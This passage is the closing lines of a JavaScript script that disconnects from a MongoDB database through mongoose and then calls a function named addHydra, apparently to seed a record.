        await mongoose.disconnect();
    }
}

addHydra();
